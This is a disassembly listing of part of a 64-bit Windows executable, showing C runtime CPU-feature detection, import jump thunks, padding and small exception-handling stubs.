   140002cde:	48 23 c1             	and    %rcx,%rax
   140002ce1:	4c 03 c8             	add    %rax,%r9
   140002ce4:	4c 33 ca             	xor    %rdx,%r9
   140002ce7:	49 8b c9             	mov    %r9,%rcx
   140002cea:	5b                   	pop    %rbx
   140002ceb:	e9 c0 f2 ff ff       	jmp    0x140001fb0
   140002cf0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002cf5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002cfa:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002cff:	57                   	push   %rdi
   140002d00:	48 83 ec 10          	sub    $0x10,%rsp
   140002d04:	33 c0                	xor    %eax,%eax
   140002d06:	33 c9                	xor    %ecx,%ecx
   140002d08:	0f a2                	cpuid
   140002d0a:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140002d10:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140002d16:	0b d1                	or     %ecx,%edx
   140002d18:	8b e8                	mov    %eax,%ebp
   140002d1a:	b8 01 00 00 00       	mov    $0x1,%eax
   140002d1f:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140002d25:	0b d3                	or     %ebx,%edx
   140002d27:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140002d2a:	0f a2                	cpuid
   140002d2c:	8b f9                	mov    %ecx,%edi
   140002d2e:	75 5e                	jne    0x140002d8e
   140002d30:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140002d35:	48 c7 05 70 33 00 00 	movq   $0x8000,0x3370(%rip)        # 0x1400060b0
   140002d3c:	00 80 00 00 
   140002d40:	48 c7 05 6d 33 00 00 	movq   $0xffffffffffffffff,0x336d(%rip)        # 0x1400060b8
   140002d47:	ff ff ff ff 
   140002d4b:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140002d50:	74 28                	je     0x140002d7a
   140002d52:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140002d57:	74 21                	je     0x140002d7a
   140002d59:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140002d5e:	74 1a                	je     0x140002d7a
   140002d60:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140002d65:	83 f8 20             	cmp    $0x20,%eax
   140002d68:	77 24                	ja     0x140002d8e
   140002d6a:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140002d71:	00 00 00 
   140002d74:	48 0f a3 c1          	bt     %rax,%rcx
   140002d78:	73 14                	jae    0x140002d8e
   140002d7a:	44 8b 05 f7 39 00 00 	mov    0x39f7(%rip),%r8d        # 0x140006778
   140002d81:	41 83 c8 01          	or     $0x1,%r8d
   140002d85:	44 89 05 ec 39 00 00 	mov    %r8d,0x39ec(%rip)        # 0x140006778
   140002d8c:	eb 07                	jmp    0x140002d95
   140002d8e:	44 8b 05 e3 39 00 00 	mov    0x39e3(%rip),%r8d        # 0x140006778
   140002d95:	45 33 c9             	xor    %r9d,%r9d
   140002d98:	41 8b f1             	mov    %r9d,%esi
   140002d9b:	45 8b d1             	mov    %r9d,%r10d
   140002d9e:	45 8b d9             	mov    %r9d,%r11d
   140002da1:	83 fd 07             	cmp    $0x7,%ebp
   140002da4:	7c 40                	jl     0x140002de6
   140002da6:	41 8d 41 07          	lea    0x7(%r9),%eax
   140002daa:	33 c9                	xor    %ecx,%ecx
   140002dac:	0f a2                	cpuid
   140002dae:	8b f2                	mov    %edx,%esi
   140002db0:	44 8b cb             	mov    %ebx,%r9d
   140002db3:	0f ba e3 09          	bt     $0x9,%ebx
   140002db7:	73 0b                	jae    0x140002dc4
   140002db9:	41 83 c8 02          	or     $0x2,%r8d
   140002dbd:	44 89 05 b4 39 00 00 	mov    %r8d,0x39b4(%rip)        # 0x140006778
   140002dc4:	83 f8 01             	cmp    $0x1,%eax
   140002dc7:	7c 0d                	jl     0x140002dd6
   140002dc9:	b8 07 00 00 00       	mov    $0x7,%eax
   140002dce:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140002dd1:	0f a2                	cpuid
   140002dd3:	44 8b d2             	mov    %edx,%r10d
   140002dd6:	b8 24 00 00 00       	mov    $0x24,%eax
   140002ddb:	3b e8                	cmp    %eax,%ebp
   140002ddd:	7c 07                	jl     0x140002de6
   140002ddf:	33 c9                	xor    %ecx,%ecx
   140002de1:	0f a2                	cpuid
   140002de3:	44 8b db             	mov    %ebx,%r11d
   140002de6:	48 8b 05 b3 32 00 00 	mov    0x32b3(%rip),%rax        # 0x1400060a0
   140002ded:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140002df1:	c7 05 ad 32 00 00 01 	movl   $0x1,0x32ad(%rip)        # 0x1400060a8
   140002df8:	00 00 00 
   140002dfb:	c7 05 a7 32 00 00 02 	movl   $0x2,0x32a7(%rip)        # 0x1400060ac
   140002e02:	00 00 00 
   140002e05:	48 89 05 94 32 00 00 	mov    %rax,0x3294(%rip)        # 0x1400060a0
   140002e0c:	0f ba e7 14          	bt     $0x14,%edi
   140002e10:	73 1f                	jae    0x140002e31
   140002e12:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140002e16:	c7 05 88 32 00 00 02 	movl   $0x2,0x3288(%rip)        # 0x1400060a8
   140002e1d:	00 00 00 
   140002e20:	48 89 05 79 32 00 00 	mov    %rax,0x3279(%rip)        # 0x1400060a0
   140002e27:	c7 05 7b 32 00 00 06 	movl   $0x6,0x327b(%rip)        # 0x1400060ac
   140002e2e:	00 00 00 
   140002e31:	0f ba e7 1b          	bt     $0x1b,%edi
   140002e35:	0f 83 33 01 00 00    	jae    0x140002f6e
   140002e3b:	33 c9                	xor    %ecx,%ecx
   140002e3d:	0f 01 d0             	xgetbv
   140002e40:	48 c1 e2 20          	shl    $0x20,%rdx
   140002e44:	48 0b d0             	or     %rax,%rdx
   140002e47:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002e4c:	0f ba e7 1c          	bt     $0x1c,%edi
   140002e50:	0f 83 fc 00 00 00    	jae    0x140002f52
   140002e56:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002e5b:	24 06                	and    $0x6,%al
   140002e5d:	3c 06                	cmp    $0x6,%al
   140002e5f:	0f 85 ed 00 00 00    	jne    0x140002f52
   140002e65:	8b 05 41 32 00 00    	mov    0x3241(%rip),%eax        # 0x1400060ac
   140002e6b:	b2 e0                	mov    $0xe0,%dl
   140002e6d:	83 c8 08             	or     $0x8,%eax
   140002e70:	c7 05 2e 32 00 00 03 	movl   $0x3,0x322e(%rip)        # 0x1400060a8
   140002e77:	00 00 00 
   140002e7a:	89 05 2c 32 00 00    	mov    %eax,0x322c(%rip)        # 0x1400060ac
   140002e80:	41 f6 c1 20          	test   $0x20,%r9b
   140002e84:	74 62                	je     0x140002ee8
   140002e86:	83 c8 20             	or     $0x20,%eax
   140002e89:	c7 05 15 32 00 00 05 	movl   $0x5,0x3215(%rip)        # 0x1400060a8
   140002e90:	00 00 00 
   140002e93:	89 05 13 32 00 00    	mov    %eax,0x3213(%rip)        # 0x1400060ac
   140002e99:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140002e9e:	48 8b 05 fb 31 00 00 	mov    0x31fb(%rip),%rax        # 0x1400060a0
   140002ea5:	44 23 c9             	and    %ecx,%r9d
   140002ea8:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140002eac:	48 89 05 ed 31 00 00 	mov    %rax,0x31ed(%rip)        # 0x1400060a0
   140002eb3:	44 3b c9             	cmp    %ecx,%r9d
   140002eb6:	75 37                	jne    0x140002eef
   140002eb8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002ebd:	22 c2                	and    %dl,%al
   140002ebf:	3a c2                	cmp    %dl,%al
   140002ec1:	75 25                	jne    0x140002ee8
   140002ec3:	48 8b 05 d6 31 00 00 	mov    0x31d6(%rip),%rax        # 0x1400060a0
   140002eca:	83 0d db 31 00 00 40 	orl    $0x40,0x31db(%rip)        # 0x1400060ac
   140002ed1:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140002ed5:	c7 05 c9 31 00 00 06 	movl   $0x6,0x31c9(%rip)        # 0x1400060a8
   140002edc:	00 00 00 
   140002edf:	48 89 05 ba 31 00 00 	mov    %rax,0x31ba(%rip)        # 0x1400060a0
   140002ee6:	eb 07                	jmp    0x140002eef
   140002ee8:	48 8b 05 b1 31 00 00 	mov    0x31b1(%rip),%rax        # 0x1400060a0
   140002eef:	0f ba e6 17          	bt     $0x17,%esi
   140002ef3:	73 0c                	jae    0x140002f01
   140002ef5:	48 0f ba f0 18       	btr    $0x18,%rax
   140002efa:	48 89 05 9f 31 00 00 	mov    %rax,0x319f(%rip)        # 0x1400060a0
   140002f01:	41 0f ba e2 13       	bt     $0x13,%r10d
   140002f06:	73 4a                	jae    0x140002f52
   140002f08:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002f0d:	22 c2                	and    %dl,%al
   140002f0f:	3a c2                	cmp    %dl,%al
   140002f11:	75 3f                	jne    0x140002f52
   140002f13:	41 8b cb             	mov    %r11d,%ecx
   140002f16:	41 8b c3             	mov    %r11d,%eax
   140002f19:	48 c1 e9 10          	shr    $0x10,%rcx
   140002f1d:	25 ff 00 04 00       	and    $0x400ff,%eax
   140002f22:	83 e1 06             	and    $0x6,%ecx
   140002f25:	89 05 49 38 00 00    	mov    %eax,0x3849(%rip)        # 0x140006774
   140002f2b:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140002f32:	48 f7 d1             	not    %rcx
   140002f35:	48 23 0d 64 31 00 00 	and    0x3164(%rip),%rcx        # 0x1400060a0
   140002f3c:	48 89 0d 5d 31 00 00 	mov    %rcx,0x315d(%rip)        # 0x1400060a0
   140002f43:	3c 01                	cmp    $0x1,%al
   140002f45:	76 0b                	jbe    0x140002f52
   140002f47:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140002f4b:	48 89 0d 4e 31 00 00 	mov    %rcx,0x314e(%rip)        # 0x1400060a0
   140002f52:	41 0f ba e2 15       	bt     $0x15,%r10d
   140002f57:	73 15                	jae    0x140002f6e
   140002f59:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002f5e:	48 0f ba e0 13       	bt     $0x13,%rax
   140002f63:	73 09                	jae    0x140002f6e
   140002f65:	48 0f ba 35 32 31 00 	btrq   $0x7,0x3132(%rip)        # 0x1400060a0
   140002f6c:	00 07 
   140002f6e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140002f73:	33 c0                	xor    %eax,%eax
   140002f75:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140002f7a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002f7f:	48 83 c4 10          	add    $0x10,%rsp
   140002f83:	5f                   	pop    %rdi
   140002f84:	c3                   	ret
   140002f85:	cc                   	int3
   140002f86:	cc                   	int3
   140002f87:	cc                   	int3
   140002f88:	33 c0                	xor    %eax,%eax
   140002f8a:	39 05 30 31 00 00    	cmp    %eax,0x3130(%rip)        # 0x1400060c0
   140002f90:	0f 95 c0             	setne  %al
   140002f93:	c3                   	ret
   140002f94:	ff 25 d6 11 00 00    	jmp    *0x11d6(%rip)        # 0x140004170
   140002f9a:	ff 25 b8 11 00 00    	jmp    *0x11b8(%rip)        # 0x140004158
   140002fa0:	ff 25 a2 11 00 00    	jmp    *0x11a2(%rip)        # 0x140004148
   140002fa6:	ff 25 94 11 00 00    	jmp    *0x1194(%rip)        # 0x140004140
   140002fac:	ff 25 86 11 00 00    	jmp    *0x1186(%rip)        # 0x140004138
   140002fb2:	ff 25 78 11 00 00    	jmp    *0x1178(%rip)        # 0x140004130
   140002fb8:	ff 25 6a 11 00 00    	jmp    *0x116a(%rip)        # 0x140004128
   140002fbe:	ff 25 5c 11 00 00    	jmp    *0x115c(%rip)        # 0x140004120
   140002fc4:	ff 25 96 11 00 00    	jmp    *0x1196(%rip)        # 0x140004160
   140002fca:	ff 25 b0 11 00 00    	jmp    *0x11b0(%rip)        # 0x140004180
   140002fd0:	ff 25 b2 11 00 00    	jmp    *0x11b2(%rip)        # 0x140004188
   140002fd6:	ff 25 5c 12 00 00    	jmp    *0x125c(%rip)        # 0x140004238
   140002fdc:	ff 25 4e 12 00 00    	jmp    *0x124e(%rip)        # 0x140004230
   140002fe2:	ff 25 d0 11 00 00    	jmp    *0x11d0(%rip)        # 0x1400041b8
   140002fe8:	ff 25 32 12 00 00    	jmp    *0x1232(%rip)        # 0x140004220
   140002fee:	ff 25 24 12 00 00    	jmp    *0x1224(%rip)        # 0x140004218
   140002ff4:	ff 25 46 12 00 00    	jmp    *0x1246(%rip)        # 0x140004240
   140002ffa:	ff 25 10 12 00 00    	jmp    *0x1210(%rip)        # 0x140004210
   140003000:	ff 25 02 12 00 00    	jmp    *0x1202(%rip)        # 0x140004208
   140003006:	ff 25 1c 12 00 00    	jmp    *0x121c(%rip)        # 0x140004228
   14000300c:	ff 25 e6 11 00 00    	jmp    *0x11e6(%rip)        # 0x1400041f8
   140003012:	ff 25 38 12 00 00    	jmp    *0x1238(%rip)        # 0x140004250
   140003018:	ff 25 d2 11 00 00    	jmp    *0x11d2(%rip)        # 0x1400041f0
   14000301e:	ff 25 c4 11 00 00    	jmp    *0x11c4(%rip)        # 0x1400041e8
   140003024:	ff 25 b6 11 00 00    	jmp    *0x11b6(%rip)        # 0x1400041e0
   14000302a:	ff 25 78 11 00 00    	jmp    *0x1178(%rip)        # 0x1400041a8
   140003030:	ff 25 62 11 00 00    	jmp    *0x1162(%rip)        # 0x140004198
   140003036:	ff 25 1c 12 00 00    	jmp    *0x121c(%rip)        # 0x140004258
   14000303c:	ff 25 4e 11 00 00    	jmp    *0x114e(%rip)        # 0x140004190
   140003042:	ff 25 b8 11 00 00    	jmp    *0x11b8(%rip)        # 0x140004200
   140003048:	ff 25 7a 11 00 00    	jmp    *0x117a(%rip)        # 0x1400041c8
   14000304e:	ff 25 7c 11 00 00    	jmp    *0x117c(%rip)        # 0x1400041d0
   140003054:	ff 25 7e 11 00 00    	jmp    *0x117e(%rip)        # 0x1400041d8
   14000305a:	cc                   	int3
   14000305b:	cc                   	int3
   14000305c:	48 8b c4             	mov    %rsp,%rax
   14000305f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003063:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003067:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000306b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000306f:	41 56                	push   %r14
   140003071:	48 83 ec 20          	sub    $0x20,%rsp
   140003075:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140003079:	48 8b f2             	mov    %rdx,%rsi
   14000307c:	4d 8b f0             	mov    %r8,%r14
   14000307f:	48 8b e9             	mov    %rcx,%rbp
   140003082:	49 8b d1             	mov    %r9,%rdx
   140003085:	48 8b ce             	mov    %rsi,%rcx
   140003088:	49 8b f9             	mov    %r9,%rdi
   14000308b:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   14000308f:	e8 fc fb ff ff       	call   0x140002c90
   140003094:	8b 45 04             	mov    0x4(%rbp),%eax
   140003097:	24 66                	and    $0x66,%al
   140003099:	f6 d8                	neg    %al
   14000309b:	b8 01 00 00 00       	mov    $0x1,%eax
   1400030a0:	45 1b c9             	sbb    %r9d,%r9d
   1400030a3:	41 f7 d9             	neg    %r9d
   1400030a6:	44 03 c8             	add    %eax,%r9d
   1400030a9:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   1400030ad:	74 11                	je     0x1400030c0
   1400030af:	4c 8b cf             	mov    %rdi,%r9
   1400030b2:	4d 8b c6             	mov    %r14,%r8
   1400030b5:	48 8b d6             	mov    %rsi,%rdx
   1400030b8:	48 8b cd             	mov    %rbp,%rcx
   1400030bb:	e8 d4 fe ff ff       	call   0x140002f94
   1400030c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030c5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400030ca:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400030cf:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400030d4:	48 83 c4 20          	add    $0x20,%rsp
   1400030d8:	41 5e                	pop    %r14
   1400030da:	c3                   	ret
   1400030db:	ff 25 6f 10 00 00    	jmp    *0x106f(%rip)        # 0x140004150
   1400030e1:	cc                   	int3
   1400030e2:	cc                   	int3
   1400030e3:	cc                   	int3
   1400030e4:	cc                   	int3
   1400030e5:	cc                   	int3
   1400030e6:	cc                   	int3
   1400030e7:	cc                   	int3
   1400030e8:	cc                   	int3
   1400030e9:	cc                   	int3
   1400030ea:	cc                   	int3
   1400030eb:	cc                   	int3
   1400030ec:	cc                   	int3
   1400030ed:	cc                   	int3
   1400030ee:	cc                   	int3
   1400030ef:	cc                   	int3
   1400030f0:	cc                   	int3
   1400030f1:	cc                   	int3
   1400030f2:	cc                   	int3
   1400030f3:	cc                   	int3
   1400030f4:	cc                   	int3
   1400030f5:	cc                   	int3
   1400030f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400030fd:	00 00 00 
   140003100:	ff e0                	jmp    *%rax
   140003102:	cc                   	int3
   140003103:	cc                   	int3
   140003104:	cc                   	int3
   140003105:	cc                   	int3
   140003106:	cc                   	int3
   140003107:	cc                   	int3
   140003108:	cc                   	int3
   140003109:	cc                   	int3
   14000310a:	cc                   	int3
   14000310b:	cc                   	int3
   14000310c:	cc                   	int3
   14000310d:	cc                   	int3
   14000310e:	cc                   	int3
   14000310f:	cc                   	int3
   140003110:	cc                   	int3
   140003111:	cc                   	int3
   140003112:	cc                   	int3
   140003113:	cc                   	int3
   140003114:	cc                   	int3
   140003115:	cc                   	int3
   140003116:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000311d:	00 00 00 
   140003120:	ff 25 a2 11 00 00    	jmp    *0x11a2(%rip)        # 0x1400042c8
   140003126:	cc                   	int3
   140003127:	cc                   	int3
   140003128:	cc                   	int3
   140003129:	cc                   	int3
   14000312a:	cc                   	int3
   14000312b:	cc                   	int3
   14000312c:	cc                   	int3
   14000312d:	cc                   	int3
   14000312e:	cc                   	int3
   14000312f:	cc                   	int3
   140003130:	48 8d 8a d0 00 00 00 	lea    0xd0(%rdx),%rcx
   140003137:	e9 34 df ff ff       	jmp    0x140001070
   14000313c:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   140003143:	e9 28 df ff ff       	jmp    0x140001070
   140003148:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   14000314f:	e9 1c df ff ff       	jmp    0x140001070
   140003154:	48 8d 8a b8 00 00 00 	lea    0xb8(%rdx),%rcx
   14000315b:	e9 10 df ff ff       	jmp    0x140001070
   140003160:	40 55                	rex push %rbp
   140003162:	48 83 ec 20          	sub    $0x20,%rsp
   140003166:	48 8b ea             	mov    %rdx,%rbp
   140003169:	ba 18 00 00 00       	mov    $0x18,%edx
   14000316e:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   140003175:	e8 56 ee ff ff       	call   0x140001fd0
   14000317a:	48 83 c4 20          	add    $0x20,%rsp
   14000317e:	5d                   	pop    %rbp
   14000317f:	c3                   	ret
   140003180:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   140003187:	e9 74 de ff ff       	jmp    0x140001000
   14000318c:	40 55                	rex push %rbp
   14000318e:	48 83 ec 20          	sub    $0x20,%rsp
   140003192:	48 8b ea             	mov    %rdx,%rbp
   140003195:	ba 18 00 00 00       	mov    $0x18,%edx
   14000319a:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   1400031a1:	e8 2a ee ff ff       	call   0x140001fd0
   1400031a6:	48 83 c4 20          	add    $0x20,%rsp
   1400031aa:	5d                   	pop    %rbp
   1400031ab:	c3                   	ret
   1400031ac:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   1400031b3:	e9 48 de ff ff       	jmp    0x140001000
   1400031b8:	40 55                	rex push %rbp
   1400031ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400031be:	48 8b ea             	mov    %rdx,%rbp
   1400031c1:	ba 18 00 00 00       	mov    $0x18,%edx
   1400031c6:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   1400031cd:	e8 fe ed ff ff       	call   0x140001fd0
   1400031d2:	48 83 c4 20          	add    $0x20,%rsp
   1400031d6:	5d                   	pop    %rbp
   1400031d7:	c3                   	ret
   1400031d8:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   1400031df:	e9 1c de ff ff       	jmp    0x140001000
   1400031e4:	40 55                	rex push %rbp
   1400031e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400031ea:	48 8b ea             	mov    %rdx,%rbp
   1400031ed:	ba 18 00 00 00       	mov    $0x18,%edx
   1400031f2:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   1400031f9:	e8 d2 ed ff ff       	call   0x140001fd0
   1400031fe:	48 83 c4 20          	add    $0x20,%rsp
   140003202:	5d                   	pop    %rbp
   140003203:	c3                   	ret
   140003204:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   14000320b:	e9 f0 dd ff ff       	jmp    0x140001000
   140003210:	40 55                	rex push %rbp
   140003212:	48 83 ec 20          	sub    $0x20,%rsp
   140003216:	48 8b ea             	mov    %rdx,%rbp
   140003219:	ba 18 00 00 00       	mov    $0x18,%edx
   14000321e:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   140003225:	e8 a6 ed ff ff       	call   0x140001fd0
   14000322a:	48 83 c4 20          	add    $0x20,%rsp
   14000322e:	5d                   	pop    %rbp
   14000322f:	c3                   	ret
   140003230:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   140003237:	e9 c4 dd ff ff       	jmp    0x140001000
   14000323c:	40 55                	rex push %rbp
   14000323e:	48 83 ec 20          	sub    $0x20,%rsp
   140003242:	48 8b ea             	mov    %rdx,%rbp
   140003245:	ba 18 00 00 00       	mov    $0x18,%edx
   14000324a:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   140003251:	e8 7a ed ff ff       	call   0x140001fd0
   140003256:	48 83 c4 20          	add    $0x20,%rsp
   14000325a:	5d                   	pop    %rbp
   14000325b:	c3                   	ret
   14000325c:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   140003263:	e9 98 dd ff ff       	jmp    0x140001000
   140003268:	40 55                	rex push %rbp
   14000326a:	48 83 ec 20          	sub    $0x20,%rsp
   14000326e:	48 8b ea             	mov    %rdx,%rbp
   140003271:	ba 18 00 00 00       	mov    $0x18,%edx
   140003276:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000327a:	e8 51 ed ff ff       	call   0x140001fd0
   14000327f:	48 83 c4 20          	add    $0x20,%rsp
   140003283:	5d                   	pop    %rbp
   140003284:	c3                   	ret
   140003285:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   14000328c:	e9 6f dd ff ff       	jmp    0x140001000
   140003291:	48 8d 8a b8 00 00 00 	lea    0xb8(%rdx),%rcx
   140003298:	e9 d3 dd ff ff       	jmp    0x140001070
   14000329d:	48 8d 8a d0 00 00 00 	lea    0xd0(%rdx),%rcx
   1400032a4:	e9 c7 dd ff ff       	jmp    0x140001070
   1400032a9:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   1400032b0:	e9 bb dd ff ff       	jmp    0x140001070
   1400032b5:	40 55                	rex push %rbp
   1400032b7:	48 83 ec 20          	sub    $0x20,%rsp
   1400032bb:	48 8b ea             	mov    %rdx,%rbp
   1400032be:	ba 18 00 00 00       	mov    $0x18,%edx
   1400032c3:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   1400032ca:	e8 01 ed ff ff       	call   0x140001fd0
   1400032cf:	48 83 c4 20          	add    $0x20,%rsp
   1400032d3:	5d                   	pop    %rbp
   1400032d4:	c3                   	ret
   1400032d5:	48 8d 8a f0 00 00 00 	lea    0xf0(%rdx),%rcx
   1400032dc:	e9 1f dd ff ff       	jmp    0x140001000
   1400032e1:	40 55                	rex push %rbp
   1400032e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400032e7:	48 8b ea             	mov    %rdx,%rbp
   1400032ea:	48 8b d1             	mov    %rcx,%rdx
   1400032ed:	48 8b 09             	mov    (%rcx),%rcx
   1400032f0:	8b 09                	mov    (%rcx),%ecx
   1400032f2:	e8 df fc ff ff       	call   0x140002fd6
   1400032f7:	90                   	nop
   1400032f8:	48 83 c4 20          	add    $0x20,%rsp
   1400032fc:	5d                   	pop    %rbp
   1400032fd:	c3                   	ret
   1400032fe:	cc                   	int3
   1400032ff:	40 55                	rex push %rbp
   140003301:	48 8b ea             	mov    %rdx,%rbp
   140003304:	48 8b 01             	mov    (%rcx),%rax
   140003307:	33 c9                	xor    %ecx,%ecx
   140003309:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000330f:	0f 94 c1             	sete   %cl
   140003312:	8b c1                	mov    %ecx,%eax
   140003314:	5d                   	pop    %rbp
   140003315:	c3                   	ret
   140003316:	cc                   	int3
